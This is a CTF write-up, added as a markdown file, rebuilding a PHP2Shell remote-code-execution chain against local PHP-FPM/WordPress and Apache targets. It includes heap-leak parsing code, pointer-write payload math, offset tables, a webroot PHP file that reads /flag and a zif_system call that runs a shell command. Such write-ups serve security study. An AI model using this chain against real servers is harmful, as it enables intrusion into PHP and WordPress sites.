@@ -1,0 +1,574 @@
+---
+title: HITCON CTF 2026 - WEB - PHP2SHELL (REAL)
+date: '2026-11-01'
+tags: ['hitcon', 'web', 'php', 'php-fpm', 'wordpress', 'heap', 'rce', 'writeup']
+draft: false
+summary: Rebuilding php2shell against randomized Nginx/PHP-FPM and Apache/WordPress targets, from a stale decoder and heap leak to a webroot write.
+images: ['/static/writeups/hitcon/php2shell-real/1-cover.png']
+authors: ['default']
+---
+
+![php2shell real cover](/static/writeups/hitcon/php2shell-real/1-cover.png)
+
+This challenge was basically: take the new PHP2Shell bug, remove every clean-lab assumption, add WordPress, randomize the versions, warm the heaps, throw random traffic at the workers, and give only ten instance spawns.
+
+So yeah, easy web challenge :)
+
+> [!IMPORTANT]
+> This is a **post-contest local recreation**, not a claim that I submitted three real HITCON flags. When I resumed the work, I did not have the organizer image, saved instance URLs, or a working live instancer. Everything below was reproduced against pinned local clones, and every shown flag is deliberately fake and ends in `do_not_submit`.
+
+The complete code is here: [kumailzaidi23/php2shell-fpm85-http-chain](https://github.com/kumailzaidi23/php2shell-fpm85-http-chain).
+
+## Challenge Description
+
+> There isn't an easy exploit for this php2shell vulnerability
+>
+> yeah sure, but "not easy to exploit" != "not exploitable irl"
+>
+> you get THREE instances:
+>
+> 1. Nginx + PHP FPM + WordPress (x2)
+> 2. Apache + WordPress (x1)
+>
+> every instance runs randomized vulnerable PHP / WordPress versions, is already warmed up, and keeps getting random traffic.
+>
+> you need to pwn all three, and you only get 10 instance spawns total.
+
+That last part changes the whole approach. A payload that works once after a clean container restart is not enough. I needed strict fingerprints, stage checkpoints, payload hashes, bounded retries, and a way to detect a miss before corrupting the only useful state I had.
+
+## What I Reproduced
+
+I built four pinned targets even though the challenge asked for three instances. The reason was simple: the challenge randomized the vulnerable PHP version, so proving one FPM build was not very useful.
+
+| Profile | Stack | Local result |
+| --- | --- | --- |
+| `fpm83` | Nginx + PHP-FPM 8.3.35 + WordPress 7.1.3 | Heap leak, R2a, R2b, PHP webroot write, dummy flag read |
+| `fpm84` | Nginx + PHP-FPM 8.4.26 + WordPress 6.9.10 | Heap leak, R2a, R2b, PHP webroot write, dummy flag read |
+| `fpm85` | Nginx + PHP-FPM 8.5.11 + WordPress 6.9.10 | Heap leak, R2a, R2b, PHP webroot write, dummy flag read |
+| `apache-wordpress` | Apache prefork + mod_php 8.4.26 + WordPress 7.0.7 | libphp/heap leak, `zif_system`, dummy flag copy |
+
+All FPM solvers are loopback-only. They verify the exact PHP version, WordPress version, `memory_limit`, upload-progress setting, session path, and calibrated geometry before sending a forged pointer request.
+
+## The Two Bugs Behind PHP2Shell
+
+The official PHP advisories split the problem into two related pieces:
+
+- [CVE-2026-109618 / GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w): corruption around out-of-memory bailout and request shutdown.
+- [CVE-2026-109619 / GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp): request-owned state survives in a persistent worker and is consumed by a later request.
+
+The second advisory gives the clean mental model:
+
+```text
+request A: producer publishes request-owned state
+request A: fatal path skips the matching reset
+request A: request heap is freed, worker stays alive
+request B: early consumer uses the stale pointer
+```
+
+For this challenge the SAPI matters a lot.
+
+### Apache
+
+Apache `mod_php` still runs request shutdown after a startup OOM. That makes the public A1/B1/A2/B2 route possible before WordPress even matters much.
+
+### PHP-FPM
+
+FPM kills a child when request startup itself fails. So the Apache startup trick cannot just be copied over.
+
+The producer has to happen **after successful request startup**, inside application execution. WordPress gives a useful route because core loads serialized options and transients through `maybe_unserialize()`. If memory runs out after `php_var_unserialize_init()` publishes its decoder state but before `php_var_unserialize_destroy()`, `BG(unserialize).data` can still point into the freed request heap after shutdown.
+
+The next multipart request reaches session upload-progress decoding before normal request initialization clears that state. That is the FPM bridge.
+
+## FPM Exploit Overview
+
+![Complete FPM chain](/static/writeups/hitcon/php2shell-real/2-fpm-chain.png)
+
+My final FPM flow was:
+
+```text
+seed session record
+    ↓
+application-stage producer leaves stale decoder
+    ↓
+consumer reflects heap pointers through WordPress search
+    ↓
+re-arm producer
+    ↓
+R2a: progress array -> scalar
+    ↓
+R2b: scalar -> scalar + empty array
+    ↓
+R3: redirect session output into webroot
+    ↓
+GET written PHP file -> /flag
+```
+
+The weird-looking R2a/R2b split is important. One consumer gives a limited sequence of native pointer stores. I used the first stage to create a simpler serialized root, then the second stage to preserve two roots for the final file-handler overwrite.
+
+## Stage 0: Freeze Everything
+
+Heap exploits and “I changed one harmless byte” do not mix.
+
+Every important multipart request has an expected byte length and SHA-256. The solver refuses to continue if a builder changes. For example, the FPM 8.4 producer must remain exactly:
+
+```text
+294,890 bytes
+sha256 b0ec513af7b3900b5590c510a5b6106853b6516d4511bed4664542841c6dede2
+```
+
+The leak body must remain:
+
+```text
+217,879 bytes
+sha256 23f54d864ad3cffdb41eaa2db618ca872adbea47de6ea674c2471042bb4f5ce7
+```
+
+I also locked the local ports for the 8.4 and 8.5 profiles because the calibration was done against those exact HTTP shapes. The runner performs a preflight before exploitation:
+
+```text
+PHP 8.4.26
+WordPress 6.9.10
+memory_limit=128M
+session.upload_progress.enabled=1
+session.save_path=/tmp
+```
+
+If any one of these changes, the solver stops. Guessing with a stale offset is worse than a clean failure.
+
+## Stage 1: Seed a Persistent Upload-Progress Record
+
+The exploit needs state that survives worker replacement. The normal PHP files session handler gives exactly that: a file under `/tmp/sess_<sid>`.
+
+The seed request contains:
+
+```text
+PHPSESSID=<15 byte sid>
+PHP_SESSION_UPLOAD_PROGRESS=stockdwatch
+one tracked upload
+hundreds of deeply nested empty file controls
+```
+
+A simplified builder looks like this:
+
+```python
+def make_pressure_body(count, depth, *, progress, session_id):
+    if progress:
+        part("PHPSESSID", session_id.encode())
+        part("PHP_SESSION_UPLOAD_PROGRESS", b"stockdwatch")
+        part("f", b"Z", filename=b"f.bin")
+
+    for i in range(count):
+        part(f"x{i}" + "[a]" * depth, b"", filename=b"")
+```
+
+Empty file controls are useful because PHP still builds the multipart metadata arrays for them. Deep names multiply the allocation work. This gave me a very fine pressure dial without uploading hundreds of megabytes.
+
+For FPM 8.4 and 8.5, the initial seed uses 1,017 nested controls. The request saves a normal upload-progress array and then replaces the worker. The session file remains on disk, so the next clean child starts with a known record.
+
+The solver checks all of this:
+
+- the worker PID changed;
+- the session file exists;
+- the record is 327 or 331 bytes for the profile;
+- it begins with the expected upload-progress array;
+- later producer requests do not modify it.
+
+That session file becomes the checkpoint between exploit stages.
+
+## Stage 2: Leave `BG(unserialize)` Stale
+
+Now I need an OOM that happens late enough for FPM startup to have succeeded, but early enough to interrupt a live WordPress unserializer.
+
+The FPM 8.4 producer uses:
+
+```python
+payload, boundary = make_pressure_body(
+    count=884,
+    depth=60,
+    field_count=80,
+    field_len=256,
+    progress=False,
+    session_id="",
+)
+```
+
+The nested controls consume most of the 128 MiB request heap. The ordinary 256-byte POST fields retain just enough extra memory to move the fatal into the WordPress decoder window.
+
+The successful producer has three gates:
+
+1. HTTP reaches WordPress and returns the expected memory-limit fatal.
+2. The FPM worker PID is unchanged.
+3. The target session record is byte-for-byte unchanged.
+
+Internally the state is now roughly:
+
+```text
+BG(unserialize).level = 1
+BG(unserialize).data  = pointer into request A heap
+request A heap        = freed
+FPM child             = still alive
+```
+
+The exact WordPress route is profile-specific. The 8.3 profile uses the anonymous block-pattern endpoint:
+
+```text
+/wp-json/wp/v2/block-patterns/patterns
+```
+
+It first uses a 22-field producer for the leak geometry, then a 20-field producer to re-arm the decoder for the forged consumer. The 8.4 and 8.5 clones use their calibrated front-page bootstrap shapes.
+
+Finding this window was most of the work. Too much pressure fails during multipart startup and FPM kills the child. Too little pressure lets WordPress finish and clean up the decoder. The useful result is exactly in the middle: published state, skipped destroy, surviving child.
+
+## Stage 3: Turn the Stale Decoder into a Heap Leak
+
+The consumer request reaches upload-progress session decoding before normal RINIT. Because `BG(unserialize)` still has level 1, the decoder acts as if it is nested inside the abandoned decode from the previous request.
+
+I then arranged for its pointer appends to land in a WordPress search value named `s`. WordPress reflects that value in the response, giving an HTTP-only pointer leak.
+
+For FPM 8.4, the final reflected value is 291 bytes:
+
+![Heap leak anatomy](/static/writeups/hitcon/php2shell-real/3-heap-leak.png)
+
+The leak body does a few ugly but useful things:
+
+- creates 462 deeply nested file controls;
+- adds a 75,000-byte `X-Pad` header to the last one;
+- changes the final nested depth from 60 to 55;
+- inserts two 291-byte `s` fields;
+- replaces the final file part with oversized 291-byte name and filename strings.
+
+That geometry puts fourteen decoder-created `zval *` values inside the reflected string.
+
+The parser is intentionally strict:
+
+```python
+def parse_heap_base(raw):
+    queries = [
+        unquote_to_bytes(m.group(1).replace(b"+", b" "))
+        for m in re.finditer(rb'\?s=([^"\'&<> ]+)', raw)
+    ]
+
+    matches = [
+        value for value in queries
+        if len(value) == 291
+        and value[:104] == b"Z" * 104
+        and value[216:] == b"Z" * 75
+    ]
+    if len(matches) != 1:
+        raise RuntimeError("bad reflected leak count")
+
+    words = struct.unpack("<14Q", matches[0][104:216])
+    bases = {word & ~0x1fffff for word in words}
+
+    if len(bases) != 1:
+        raise RuntimeError("pointer words disagree on heap base")
+    if not all(word % 16 == 0 and 0 < word < (1 << 47) for word in words):
+        raise RuntimeError("non-canonical pointer in leak")
+
+    return next(iter(bases))
+```
+
+The important line is:
+
+```python
+B = leaked_pointer & ~0x1fffff
+```
+
+ZendMM chunks are 2 MiB aligned, so fourteen pointers from one chunk give the chunk base `B` and defeat ASLR for the local geometry.
+
+The versions needed slightly different leak gates:
+
+- PHP 8.3: HTML entity decoding before checking the fourteen qwords.
+- PHP 8.4: `104 Z + 14 qwords + 75 Z`.
+- PHP 8.5: a tail structure containing `(-16, NULL)` to keep the useful decoder layout intact.
+
+A normal-looking HTTP 200 was never accepted as a leak. The response had to pass every structural check and the worker PID had to remain unchanged.
+
+## The Useful Primitive
+
+A heap base alone is not RCE. I still needed to make the stale decoder store pointers at chosen addresses.
+
+The useful native operation already exists inside PHP's unserializer:
+
+```c
+F->data[F->used_slots++] = source_zval_pointer;
+```
+
+If I can control `F->data` and `F->used_slots`, I can choose where the next decoder pointer is written.
+
+![Controlled decoder stores](/static/writeups/hitcon/php2shell-real/4-write-primitive.png)
+
+I used these names in the exploit:
+
+| Symbol | Meaning |
+| --- | --- |
+| `B` | Leaked 2 MiB ZendMM chunk base |
+| `P` | Live upload-progress object used as the R2 target |
+| `Q` | Files session-handler state used by R3 |
+| `F` | Fake `var_entries` bookkeeping inside the controlled BIG value |
+| `DT` | Fake destructor metadata carried beside `F` |
+
+For the FPM 8.4 R2a payload, the core calculation is:
+
+```python
+fake_entries = B + big_value_from_b + F_VALUE_OFF
+target = B + p_from_b + 0x58
+used_slots = (target - (fake_entries + 16)) // 8
+
+struct.pack_into(
+    "<9Q",
+    big,
+    D_SOURCE_OFF,
+    fake_entries, 0, 0, 0, 0, 0, 4096, 0, 0,
+)
+struct.pack_into("<qQ", big, F_VALUE_OFF, used_slots, 0)
+```
+
+The fake entry header says: start indexing from my controlled BIG allocation, then use a huge but valid `used_slots` value so the next qword store lands at `P + 0x58`.
+
+## R2a: Reduce the Session to One Scalar
+
+The original upload-progress session is a large serialized array. That is not a nice base for later stages.
+
+R2a changes it into one scalar root:
+
+```text
+upload_progress_stockdwatch|i:0;
+```
+
+PHP 8.3 uses the equivalent boolean record:
+
+```text
+upload_progress_K|b:0;
+```
+
+The forged request causes the selected worker to save the new session and then exit. That is okay. The result I care about is the persistent file, not keeping that child alive.
+
+A successful R2a must satisfy:
+
+- session file equals the exact scalar bytes;
+- the armed worker was replaced;
+- no unrelated target file appeared;
+- the response and request hashes were saved.
+
+A miss is retryable only if the original array record remains valid.
+
+## R2b: Keep Two Roots Alive
+
+R2b repeats the decoder-store trick with fake destructor metadata. The saved session becomes:
+
+```text
+upload_progress_stockdwatch|i:0;upload_progress_K2stage0001|a:0:{}
+```
+
+Now the next upload-progress decode has a scalar and an empty array root. Those give the two useful stores needed to modify the files session handler without destroying the checkpoint.
+
+Again, success is not “the request did not crash.” Success is an exact 66-byte session record with the expected SHA-256.
+
+## R3: Make PHP Write PHP
+
+The final stage targets the files session handler.
+
+I set its path state to a chosen NUL-terminated webroot filename:
+
+```python
+path = f"/var/www/html/r3-{sid}.php".encode() + b"\0"
+filename = b"<?=readfile('/flag')?>"
+```
+
+PHP still builds what it thinks is a normal session path and appends its normal suffix. The filesystem API stops at the embedded NUL, so the actual file is created at my chosen `.php` path.
+
+The tracked upload filename becomes part of the serialized upload-progress record. Therefore the redirected session write places this inside the new file:
+
+```php
+<?=readfile('/flag')?>
+```
+
+The solver then performs one ordinary GET:
+
+```text
+GET /r3-<sid>.php
+```
+
+For success I required all of these:
+
+- target session still equals the R2b pair;
+- the chosen webroot file exists;
+- the file contains the PHP marker exactly once;
+- GET returns HTTP 200;
+- the dummy flag appears in the response;
+- the literal PHP source does not appear in the response.
+
+That last check proves execution instead of a static file download.
+
+## Handling Different FPM Layouts
+
+This was not a universal offset-free exploit. `B` is leaked over HTTP, but the live `P`, `Q`, and controlled BIG placement still depend on the pinned image and request geometry.
+
+The 8.4 profile had four measured, paired candidates:
+
+| `BIG value - B` | `P - B` | `Q - B` |
+| ---: | ---: | ---: |
+| `0x801a018` | `0x8862000` | `0x53a398` |
+| `0x7e1a018` | `0x8862000` | `0x33a398` |
+| `0x801a018` | `0x8a62000` | `0x53a398` |
+| `0x7e1a018` | `0x8a62000` | `0x33a398` |
+
+I never mixed a BIG offset from one lineage with a Q offset from another. Each row is one complete hypothesis.
+
+The 8.5 profile uses bounded candidate sets:
+
+```text
+P-B: 0x8862000, 0x8662000
+Q-B: 0x608f00, 0x7a27a50, 0x7827a50
+```
+
+The clean matrix run selected `P-B=0x8662000` and `Q-B=0x608f00`.
+
+The 8.3 profile takes a safer bridge approach before every forged stage:
+
+```text
+warm -> producer22 -> fresh-SID leak B -> producer20 -> forged consumer
+```
+
+So R2a, R2b, and R3 each get a current heap base instead of reusing an old one across replacement workers.
+
+This is also why the solvers preserve exact intermediate session records. A failed candidate is only retried when the previous checkpoint remains intact:
+
+```text
+R2a miss -> original progress array still valid
+R2b miss -> scalar still valid
+R3 miss  -> pair still valid and no target file exists
+```
+
+Anything else aborts the run.
+
+## Apache Was a Separate Exploit
+
+The Apache instance cannot be treated as “FPM with another frontend.” Its worker lifecycle makes a different chain possible.
+
+![Apache A1 B1 A2 B2 chain](/static/writeups/hitcon/php2shell-real/5-apache-chain.png)
+
+The local lab used the official prefork shape with 150 workers. To make all four requests reach one selected child, I opened 149 incomplete POST requests and left one worker free.
+
+Then:
+
+### A1: Leave Stale Session ID State
+
+A 1,060,211-byte chunked multipart request exhausts the 128 MiB limit during session cleanup. Apache continues through request shutdown, leaving stale session ID state in that child.
+
+### B1: Leak `libphp` and the Main Heap
+
+The 33,128,677-byte B1 request feeds a forged identifier into the stale state. The response contains an oversized `PHPSESSID` cookie. After URL decoding, the useful leak is 819,200 bytes.
+
+The parser counts canonical qwords. The most repeated pointer is the destructor function:
+
+```python
+zval_ptr_dtor = counts.most_common(1)[0][0]
+libphp = zval_ptr_dtor - 0x65EB60
+```
+
+Then it groups pointers by 2 MiB chunk and chooses plausible main-heap candidates by their distance from `libphp`.
+
+For the clean run:
+
+```text
+libphp    = 0x7f24dc791000
+main heap = 0x7f24dac00000
+zif_system= 0x7f24dcbf6370
+```
+
+### A2: Leave Session Variables Dangling
+
+A second calibrated bailout creates the session-variable layout expected by the final fake reference and fake `HashTable`.
+
+### B2: Reach `zif_system`
+
+The final payload points the forged callback at:
+
+```python
+zif_system = libphp + 0x465370
+```
+
+and executes:
+
+```sh
+cat /flag >/out/local_flag
+```
+
+The selected Apache child normally crashes after the destructor callback. That is fine: the command completes first, Apache replaces the child, and the proof file remains.
+
+The local holder trick gives deterministic worker affinity. Random traffic in the real challenge would make this much less clean, which was exactly the point of the challenge.
+
+## Full Local Run
+
+The repository can print the entire plan without starting containers or sending requests:
+
+```bash
+python3 solve_all.py
+```
+
+To run all four pinned profiles:
+
+```bash
+python3 solve_all.py --execute
+```
+
+On my WSL setup, Docker Desktop was exposed through the Windows CLI:
+
+```bash
+python3 solve_all.py --execute --docker-command docker.exe
+```
+
+The runner creates each lab, installs WordPress, executes the bounded solver, verifies the returned dummy flag, saves request/response evidence, and tears the profile down before moving to the next one.
+
+![Four-profile local result](/static/writeups/hitcon/php2shell-real/6-local-results.png)
+
+The final evidence is stored in `evidence/full-local.json`. Every flag in that file is a local marker, not a HITCON submission.
+
+## Why This Still Is Not an Authentic HITCON Solve
+
+The local result proves the exploit ideas and the packaged profile contracts. It does **not** prove portability to the missing challenge image.
+
+The remaining real-instance problems would be:
+
+1. Fingerprint the randomized PHP and WordPress versions without Docker access.
+2. Determine which profile geometry matches each instance.
+3. Recover or derive live `P`/`Q` placement instead of trusting local measured candidates.
+4. Survive multiworker routing and unrelated traffic.
+5. Confirm webroot permissions and PHP routing for the chosen R3 path.
+6. Do all three targets inside the ten-spawn budget.
+
+The HTTP leak gives `B`; it does not magically reveal every allocator object. That difference matters. Calling the local matrix a remote universal exploit would be fake, so I am not doing that.
+
+## Things I Learned
+
+### Same CVE, different SAPI, different exploit
+
+Apache and FPM fail differently. The request stage where the fatal happens decides whether a worker survives, whether shutdown runs, and which stale state is reachable.
+
+### A leak is only the first half
+
+Getting fourteen pointers into a WordPress search box felt huge, but it only gave one 2 MiB base. The difficult part was turning the decoder's existing store into repeatable state transitions.
+
+### Session files are excellent checkpoints
+
+The exploit intentionally replaces workers several times. Persistent session records let every stage prove its result before moving on.
+
+### Hash the payloads
+
+One byte can move a ZendMM run, change a string size class, or make the fatal happen before publication. Fixed body hashes saved me from debugging accidental builder changes as if they were allocator randomness.
+
+### Fail closed
+
+Every stage checks response shape, PID, session bytes, target-file absence, and expected markers. If a miss leaves an unknown state, the correct retry strategy is a fresh lab, not another blind forged pointer request.
+
+## References
+
+- [PHP advisory: RCE via OOM corruption](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
+- [PHP advisory: RCE via stale global state](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
+- [3em0/php2shell - Apache HTTP-only research](https://github.com/3em0/php2shell)
+- [alvarodh5/php2shell - in-band ASLR bypass research](https://github.com/alvarodh5/php2shell)
+- [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
+- [Calif's PHP2Shell writeup](https://calif.io/php2shell/)
+- [My complete local four-profile recreation](https://github.com/kumailzaidi23/php2shell-fpm85-http-chain)
